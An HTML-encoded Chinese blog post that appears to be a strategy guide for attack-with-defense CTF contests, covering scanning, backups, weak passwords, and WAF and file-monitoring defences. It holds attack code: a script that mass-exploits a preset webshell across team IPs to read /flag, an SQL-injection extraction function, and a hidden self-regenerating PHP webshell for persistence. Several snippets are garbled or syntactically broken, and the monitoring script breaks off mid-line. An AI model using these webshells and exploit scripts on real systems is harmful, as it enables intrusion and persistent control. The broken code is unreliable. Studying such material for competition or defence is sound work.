&#x6BD4;&#x8D5B;&#x4E2D;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7EF4;&#x62A4;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5F97;&#x5206;&#xFF0C;&#x4FEE;&#x590D;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x653B;&#x51FB;&#x5931;&#x5206;&#x3002;<br><!--more--></p><ol><li>&#x4E00;&#x822C;&#x5206;&#x914D;Web&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x591A;&#x6570;&#x4E3A;Linux&#xFF09;&#x67D0;&#x5904;&#x5B58;&#x5728;flag&#xFF08;&#x4E00;&#x822C;&#x5728;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#xFF09;&#xFF1B;</li><li>&#x53EF;&#x80FD;&#x4F1A;&#x63D0;&#x4F9B;&#x4E00;&#x53F0;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x865A;&#x62DF;&#x673A;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0B;&#x8F7D;&#x6D41;&#x91CF;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5206;&#x6790;&#xFF1B;</li><li>flag&#x5728;&#x4E3B;&#x529E;&#x65B9;&#x7684;&#x8BBE;&#x5B9A;&#x4E0B;&#x6BCF;&#x9694;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x5237;&#x65B0;&#x4E00;&#x8F6E;&#xFF1B;</li><li>&#x5404;&#x961F;&#x4E00;&#x822C;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x521D;&#x59CB;&#x5206;&#x6570;&#xFF1B;</li><li>flag&#x4E00;&#x65E6;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x62FF;&#x8D70;&#xFF0C;&#x8BE5;&#x961F;&#x6263;&#x9664;&#x4E00;&#x5B9A;&#x79EF;&#x5206;&#xFF1B;</li><li>&#x6263;&#x9664;&#x7684;&#x79EF;&#x5206;&#x6709;&#x83B7;&#x53D6;flag&#x7684;&#x961F;&#x4F0D;&#x5747;&#x5206;&#xFF1B;</li><li>&#x4E3B;&#x529E;&#x65B9;&#x4F1A;&#x5BF9;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;&#x670D;&#x52A1;&#x8FDB;&#x884C;check&#xFF0C;&#x670D;&#x52A1;&#x5B95;&#x673A;&#x6263;&#x9664;&#x672C;&#x8F6E;flag&#x5206;&#x6570;&#xFF0C;&#x6263;&#x9664;&#x7684;&#x5206;&#x503C;&#x7531;&#x670D;&#x52A1;check&#x6B63;&#x5E38;&#x7684;&#x961F;&#x4F0D;&#x5747;&#x5206;&#xFF1B;</li><li>&#x4E00;&#x822C;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x4F1A;&#x7ED9;&#x4E00;&#x4E2A;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#xFF0C;&#x975E;root&#x6743;&#x9650;</li></ol><h1 id="&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;"><a href="#&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;" class="headerlink" title="&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;"></a>&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;</h1><p>&#x7F51;&#x7EDC;&#x62D3;&#x6251;&#x56FE;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><hr><p><img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu99r097baj30lq0fg40q.jpg" alt="&#x62D3;&#x6251;&#x56FE;"></p><p>&#x6BD4;&#x8D5B;&#x4E2D;&#x83B7;&#x53D6;flag&#x4E00;&#x822C;&#x6709;&#x4E24;&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;<br>&#xFF08;1&#xFF09;flag&#x5728;&#x6839;&#x76EE;&#x5F55;&#xFF0C;&#x8BFB;&#x53D6;flag&#x5185;&#x5BB9;&#xFF0C;&#x63D0;&#x4EA4;&#x5373;&#x53EF;&#x5F97;&#x5206;<br>&#xFF08;2&#xFF09;&#x62FF;&#x5230;&#x5176;&#x4ED6;&#x961F;&#x4F0D;shell&#x540E;&#xFF0C;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x547D;&#x4EE4;&#xFF08;curl 10.0.0.2&#xFF09;&#xFF0C;&#x5373;&#x53EF;&#x4ECE;&#x4E0A;&#x56FE;&#x4E2D;flag&#x673A;&#x83B7;&#x53D6;flag&#x5185;&#x5BB9;&#xFF1B;</p><p>&#x6BD4;&#x8D5B;&#x53EF;&#x80FD;&#x4F1A;&#x544A;&#x8BC9;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;IP&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x544A;&#x8BC9;&#x4F60;&#xFF0C;&#x4E00;&#x822C;&#x5728;&#x540C;&#x4E00;&#x4E2A;C&#x6BB5;&#x6216;&#x8005;B&#x6BB5;&#xFF0C;&#x56E0;&#x6B64;&#x9996;&#x5148;&#x5229;&#x7528;nmap&#x7B49;&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x53D1;&#x73B0;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;IP&#xFF1A;<br><code>nmap -sn 192.168.71.0/24</code><br>&#x6216;&#x8005;&#x5229;&#x7528;<a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> &#x7684;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x626B;&#x63CF;</p><h1 id="&#x4E09;&#x3001;-&#x6BD4;&#x8D5B;&#x5206;&#x5DE5;"><a href="#&#x4E09;&#x3001;-&#x6BD4;&#x8D5B;&#x5206;&#x5DE5;" class="headerlink" title="&#x4E09;&#x3001; &#x6BD4;&#x8D5B;&#x5206;&#x5DE5;"></a>&#x4E09;&#x3001; &#x6BD4;&#x8D5B;&#x5206;&#x5DE5;</h1><p>&#x7EBF;&#x4E0B;&#x8D5B;&#x4E00;&#x822C;3&#x4EBA;&#x5DE6;&#x53F3;&#xFF0C;2&#x4EBA;&#x653B;&#x51FB;&#xFF0C;1&#x4EBA;&#x9632;&#x5FA1;&#xFF0C;&#x56E0;&#x4E3A;&#x53D1;&#x73B0;&#x7684;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#xFF0C;&#x4E5F;&#x8981;&#x8FDB;&#x884C;&#x4FEE;&#x590D;&#xFF0C;&#x6240;&#x4EE5;&#x653B;&#x9632;&#x76F8;&#x8F85;&#x76F8;&#x6210;&#xFF0C;&#x4EE5;&#x653B;&#x4E3A;&#x5B88;&#x3002;</p><p>&#x6BD4;&#x8D5B;&#x4E2D;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x53EF;&#x80FD;&#x4F1A;&#x7EF4;&#x62A4;&#x591A;&#x4E2A;&#x9776;&#x673A;&#xFF0C;web&#x3001;&#x4E8C;&#x8FDB;&#x5236;&#x7B49;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6CA1;&#x4EBA;&#x8D1F;&#x8D23;&#x4E00;&#x53F0;&#xFF0C;&#x5404;&#x81EA;&#x8D1F;&#x8D23;&#x653B;&#x51FB;&#x548C;&#x9632;&#x5FA1;&#x3002;</p><h1 id="&#x56DB;&#x3001;-&#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;"><a href="#&#x56DB;&#x3001;-&#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;" class="headerlink" title="&#x56DB;&#x3001; &#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;"></a>&#x56DB;&#x3001; &#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;</h1><ol><li>&#x5907;&#x4EFD;&#xFF01;&#x5907;&#x4EFD;&#xFF01;&#x5907;&#x4EFD;&#xFF01;<br>&#x91CD;&#x8981;&#x7684;&#x4E8B;&#x60C5;&#x8BF4;&#x4E09;&#x904D;&#xFF0C;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5907;&#x4EFD;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#xFF08;/var/www/html)&#xFF0C;&#x8FD9;&#x662F;&#x6211;&#x81EA;&#x6211;&#x5BA1;&#x8BA1;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4E5F;&#x662F;&#x9632;&#x6B62;&#x670D;&#x52A1;&#x5668;&#x5728;&#x6BD4;&#x8D5B;&#x4E2D;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x7ACB;&#x5373;&#x6062;&#x590D;&#x5230;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x7684;&#x5148;&#x51B3;&#x6761;&#x4EF6;&#x3002;&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;3&#x6B21;&#x5DE6;&#x53F3;&#x7684;&#x6062;&#x590D;&#x521D;&#x59CB;&#x8BBE;&#x7F6E;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x4E0D;&#x63D0;&#x4F9B;&#xFF0C;&#x6240;&#x4EE5;&#x5907;&#x4EFD;&#x5341;&#x5206;&#x91CD;&#x8981;&#x3002;</li></ol><p>&#x53EF;&#x4EE5;&#x7528;scp&#x547D;&#x4EE4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x4E9B;&#x56FE;&#x5F62;&#x5316;&#x7684;&#x5DE5;&#x5177;&#xFF1A;<code>Winscp</code>&#x3001;<code>FileZilla</code>&#xFF0C;&#x64CD;&#x4F5C;&#x8D77;&#x6765;&#x6BD4;&#x4EF7;&#x65B9;&#x4FBF;&#x3002;<br><img src="https://wx1.sinaimg.cn/mw690/006ALkzYgy1fu9cs4y09ej311f0ny7ds.jpg" alt="winscp"></p><ol start="2"><li>&#x53E3;&#x4EE4;&#x95EE;&#x9898;<br>&#x5F31;&#x53E3;&#x4EE4;&#x7684;&#x95EE;&#x9898;&#x51E0;&#x4E4E;&#x662F;&#x5FC5;&#x8003;&#xFF0C;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;SSH&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF08;&#x67D0;&#x6B21;&#x6BD4;&#x8D5B;&#x4E2D;&#x90FD;&#x662F;phpCMS&#x3001;WordPress&#xFF09;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#x53E3;&#x4EE4;&#xFF0C;&#x5982;&#x679C;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x6539;&#x4E86;&#x90A3;&#x5C31;gg&#x4E86;&#x3002;</li></ol><p>Web&#x540E;&#x53F0;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x662F;admin\admin,admin\123456,test\test&#x7B49;&#x7B49;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;&#x540E;&#x53F0;&#x53E3;&#x4EE4;&#xFF0C;&#x4E3A;&#x672C;&#x961F;&#x6240;&#x7528;&#xFF0C;&#x8BF4;&#x4E0D;&#x5B9A;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x540E;&#x53F0;getshell&#xFF0C;&#x6BD4;&#x5982;&#x5341;&#x5206;&#x5E38;&#x89C1;&#x7684;WordPress&#x3002;<br><!--more--></p><ol start="3"><li><p>&#x9884;&#x7559;&#x540E;&#x95E8;<br>&#x5728;&#x7EF4;&#x62A4;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x9884;&#x7559;&#x4E86;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x540E;&#x95E8;&#xFF0C;&#x6BD4;&#x5982;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;&#x8FD9;&#x662F;&#x4E2A;&#x9001;&#x5206;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x8FC5;&#x901F;&#x6253;&#x4E00;&#x6CE2;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x89C6;&#x60C5;&#x51B5;&#x201C;&#x6405;&#x5C4E;&#x201D;&#xFF0C;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x4E00;&#x76F4;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x6BCF;&#x8F6E;&#x90FD;&#x5F97;&#x5206;&#xFF08;&#x540E;&#x9762;&#x7EC6;&#x8BF4;&#xFF09;<br>&#x5C06;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x8F7D;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x5229;&#x7528;<code>D&#x76FE;</code>&#x626B;&#x63CF;&#xFF0C;&#x4E00;&#x822C;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF1A;<br><img src="https://wx4.sinaimg.cn/mw690/006ALkzYgy1fu9copyyifj30m40gvtfi.jpg" alt="D-dun"><br>&#x53D1;&#x73B0;&#x540E;&#x95E8;&#xFF0C;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5220;&#x9664;&#xFF0C;&#x540C;&#x65F6;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x53D1;&#x8D77;&#x7B2C;&#x4E00;&#x6CE2;&#x653B;&#x51FB;&#xFF0C;&#x5982;&#x679C;&#x5229;&#x7528;&#x83DC;&#x5200;&#x8FDE;&#xFF0C;&#x663E;&#x7136;&#x4E0D;&#x591F;&#x4F18;&#x96C5;&#xFF0C;&#x8FD8;&#x6CA1;&#x8FDE;&#x5B8C;&#xFF0C;&#x4EBA;&#x5BB6;&#x4F30;&#x8BA1;&#x90FD;&#x5220;&#x7684;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x867D;&#x7136;&#x662F;&#x9001;&#x5206;&#x9898;&#xFF0C;&#x4F46;&#x6709;&#x65F6;&#x62FC;&#x7684;&#x662F;&#x624B;&#x901F;&#xFF0C;&#x56E0;&#x6B64;&#x5F97;&#x63D0;&#x524D;&#x51C6;&#x5907;&#x597D;&#x811A;&#x672C;&#xFF1A;</p><pre><code class="python"> #coding=utf-8 import requests url=&quot;http://192.168.71.&quot; url1=&quot;&quot; shell=&quot;/Upload/index.php&quot; passwd=&quot;abcde10db05bd4f6a24c94d7edde441d18545&quot; port=&quot;80&quot; payload = {passwd: &apos;system(\&apos;cat /flag\&apos;);&apos;} f=open(&quot;webshelllist.txt&quot;,&quot;w&quot;) f1=oepn(&quot;firstroud_flag.txt&quot;,&quot;w&quot;) for i in[51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]:     url1=url+str(i)+&quot;:&quot;+port+shell     try:         res=requests.post(url1,payload,timeout=1)         if res.status_code == requests.codes.ok:             print url1+&quot; connect shell sucess, flag is &quot;+res.text             print &gt;&gt;f1,url1+&quot; connect shell sucess, flag is &quot;+res.text             print &gt;&gt;f,url1+&quot;,&quot;+passwd         else:             print &quot;shell not found!&quot;     except:         print url1+&quot; connect shell fail&quot; f.close() f1.close()</code></pre><p>&#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x5730;&#x5740;&#x3001;shell&#x8DEF;&#x5F84;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF0C;&#x53D1;&#x4E86;&#x4E2A;&#x8BB0;&#x5F55;&#x5728;firstround_flag.txt&#x4E2D;&#xFF0C;&#x67D0;&#x6B21;&#x6BD4;&#x8D5B;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x5982;&#x4E0B;&#xFF1A;<br><img src="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fu9cuclrdyj30m40b344h.jpg" alt="flag"></p></li><li><p>&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;<br>&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x5305;&#x62EC;SQL&#x6CE8;&#x5165;&#x3001;&#x6587;&#x4EF6;&#x5305;&#x62EC;&#x3001;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7B49;&#x7B49;&#x3002;&#x5BF9;&#x4E8E;SQL&#x6CE8;&#x5165;&#x7C7B;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x6709;&#x8FC7;&#x6EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;<code>sqlmap</code>&#x8DD1;&#x51FA;&#x6765;&#xFF0C;&#x5728;&#x5229;&#x7528;<code>-sql-shell</code>&#x6267;&#x884C;&#xFF0C;<code>select load_file(&apos;/flag&apos;);</code>&#x5373;&#x53EF;&#x5F97;&#x5230;flag&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>into outfile</code>&#x5199;&#x6728;&#x9A6C;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x5F39;&#x836F;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x6743;&#x9650;&#x95EE;&#x9898;&#x3002;&#x7528;<code>sqlmap</code>&#x8DD1;&#x6BD4;&#x8F83;&#x8017;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>payload</code>&#x5199;&#x4E00;&#x4E2A;python&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF1A;</p><pre><code class="python"> def sqli(host):     global sess_admin     date = {&quot;section_name&quot;;&quot;asd&quot;,&quot;admin_name&quot;}:     &quot; &apos;||(SELECT updatexml(1,concat(0x7e,(select load_file(&apos;/flag&apos;)),0x7e),1))||&apos;&quot;,&quot;announcement&quot;;&quot;asd&quot;     r = sess_admin.post(&apos;http://%s/index.php/section/add&apos;%host,data=data)     flags = re.findall(r&apos;~(.+?)~&apos;,r.content)     if flags:         return flags[0]     else:         return &quot;error pwn!&quot;</code></pre></li></ol><p>&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x4E00;&#x822C;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#x3001;&#x670D;&#x52A1;&#x5668;&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x7B49;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x6728;&#x9A6C;&#xFF1B;</p><h1 id="&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;"><a href="#&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;" class="headerlink" title="&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;"></a>&#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;</h1><p>&#x8FD9;&#x91CC;&#x8BF4;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x6BD4;&#x8F83;&#x201C;&#x6405;&#x5C4E;&#x201D;&#x4E86;&#xFF0C;&#x4E0A;&#x9762;&#x8BF4;&#x5230;&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x53EF;&#x4EE5;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x4E3B;&#x8981;&#x54DF;&#x4E24;&#x79CD;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201D;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F;&#x53CD;&#x5F39;shell</p><ul><li><strong>&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201D;</strong><pre><code class="php">  &lt;?php      set_time_limit(0);      ignore_user_abort(1);      unlink(__FILE__);      while(1){          file_put_contents(&apos;./.config.php&apos;,&apos;&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97.$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97)?&gt;&apos;);          system(&apos;chmod 777 .config.php&apos;);          touch(&quot;./.config.php&quot;,mktime(20,15,1,11,28,2016));          usleep(100);      }      ?&gt;</code></pre></li></ul><p>&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF0C;&#x4E0A;&#x4F20;&#x4E0A;&#x9762;&#x7684;&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201C;&#x5E76;&#x8BBF;&#x95EE;&#xFF0C;&#x5C31;&#x4F1A;&#x4E00;&#x76F4;&#x751F;&#x6210;.config.php&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;&#x6728;&#x9A6C;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x81EA;&#x4FEE;&#x4FEE;&#x6539;&#xFF0C;&#x53EA;&#x8981;&#x522B;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x770B;&#x61C2;&#x5C31;&#x884C;&#xFF0C;&#x54C8;&#x54C8;&#x54C8;</p><ul><li><p><strong>&#x201C;&#x53CD;&#x5F39;shell&#x201D;</strong></p><pre><code class="php">  &lt;?php  ?&gt;</code></pre></li></ul><p>&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x4E0A;&#x4F20;&#x4E0A;&#x9762;&#x7684;php&#x6587;&#x4EF6;&#x5E76;&#x8BBF;&#x95EE;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7528;nc&#x53CD;&#x5F39;shell&#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x4E00;&#x76F4;&#x5F97;&#x5206;&#x4E86;<br><img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9m5f56s3j30lz0edtdi.jpg" alt="php"><br>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x4E0A;&#x9762;&#x7684;2&#x4E2D;&#x65B9;&#x6CD5;&#xFF0C;&#x9700;&#x8981;&#x7F51;&#x7AD9;&#x7684;&#x6743;&#x9650;&#x4E3A;www-data,&#x5982;&#x679C;&#x7F51;&#x7AD9;&#x7684;&#x6743;&#x9650;&#x662F;ctf&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x3002;</p><h1 id="&#x516D;&#x3001;-&#x901A;&#x7528;&#x9632;&#x5FA1;"><a href="#&#x516D;&#x3001;-&#x901A;&#x7528;&#x9632;&#x5FA1;" class="headerlink" title="&#x516D;&#x3001; &#x901A;&#x7528;&#x9632;&#x5FA1;"></a>&#x516D;&#x3001; &#x901A;&#x7528;&#x9632;&#x5FA1;</h1><p>&#x5BF9;&#x4E8E;&#x9632;&#x5FA1;&#xFF0C;&#x4E00;&#x822C;&#x901A;&#x7528;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF1A;WAF&#x3001;&#x6587;&#x4EF6;&#x76D1;&#x63A7;<br><strong>1. WAF</strong></p><p><img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9mac2q97j30lx0eidqt.jpg" alt=""><br><img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu9maehbaqj30mg0bp0xj.jpg" alt=""></p><p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;</p><ol><li>&#x5C06;waf.php&#x4F20;&#x5230;&#x8981;&#x5305;&#x542B;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;</li><li>&#x5728;&#x9875;&#x9762;&#x4E2D;&#x52A0;&#x5165;&#x9632;&#x62A4;&#xFF0C;&#x54DF;&#x4E24;&#x79CD;&#x505A;&#x6CD5;&#xFF0C;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x4E8C;&#x9009;&#x4E00;&#x5373;&#x53EF;&#xFF1A;<br>a).&#x5728;&#x6240;&#x9700;&#x8981;&#x9632;&#x62A4;&#x7684;&#x9875;&#x9762;&#x52A0;&#x5165;&#x4EE3;&#x7801;<br><code>require_once(&apos;waf.php&apos;);</code><br>&#x5C31;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x9875;&#x9762;&#x9632;&#x6CE8;&#x5165;&#x3001;&#x8DE8;&#x7AD9;<br>&#x5982;&#x679C;&#x60F3;&#x6574;&#x7AD9;&#x9632;&#x6CE8;&#xFF0C;&#x5C31;&#x5728;&#x7F51;&#x7AD9;&#x7684;&#x4E00;&#x4E2A;&#x516C;&#x7528;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x5982;&#x6570;&#x636E;&#x5E93;&#x94FE;&#x63A5;&#x6587;&#x4EF6;config.icn.php&#x4E2D;&#xFF01;<br>&#x6DFB;&#x52A0;<code>require_once(&apos;waf.php&apos;);</code>&#x6765;&#x8C03;&#x7528;&#x4EE3;&#x7801;<br>&#x5E38;&#x7528;php&#x7CFB;&#x7EDF;&#x6DFB;&#x52A0;&#x6587;&#x4EF6;</li></ol><blockquote><p>PHPCMS v9 \phpcms\base.php<br>PHPWIND8.7 \data\sql_config.php<br>DEDECMS 5.7 \data\common.inc.php<br>Discuz X2 \config\config.php_global.php<br>WordPress \wp-config.php<br>Metinfo \include\head.php</p></blockquote><p>b). &#x5728;&#x6BCF;&#x4E2A;&#x6587;&#x4EF6;&#x6700;&#x524D;&#x52A0;&#x4E0A;&#x4EE3;&#x7801;<br>&#x5728;<code>php.ini</code>&#x4E2D;&#x627E;&#x5230;</p><pre><code class="php.ini">    Automaticaly add files before or after any PHP document.    auto_prepend_file = 360_safe3.php&#x8DEF;&#x5F84;&#xFF1B;</code></pre><p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x90E8;&#x7F72;waf&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x4E0D;&#x53EF;&#x7528;&#xFF0C;&#x9700;&#x8981;&#x8C28;&#x614E;&#x90E8;&#x7F72;&#x3002;</p><p><strong>2. &#x6587;&#x4EF6;&#x76D1;&#x63A7;</strong><br>&#x6587;&#x4EF6;&#x76D1;&#x63A7;&#x53EF;&#x4EE5;&#x5BF9;web&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x53D1;&#x73B0;&#x65B0;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x6216;&#x8005;&#x88AB;&#x4FEE;&#x6539;&#x7ACB;&#x5373;&#x6062;&#x590D;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x4E0A;&#x4F20;shell&#x7B49;&#x653B;&#x51FB;&#xFF1A;</p><pre><code class="python">    # -*- coding: utf-8 -*-    #use: python file_check.py ./    import os    import hashlib    import shutil    import ntpath    import time    CWD = os.getcwd()    FILE_MD5_DICT = {}    #&#x6587;&#x4EF6;MD5&#x5B57;&#x5178;    ORIGIN_FILE_LIST = []    #&#x7279;&#x6B8A;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x7B26;&#x4E32;    Special_path_str = &apos;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&apos;    bakstring = &apos;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&apos;    logstring = 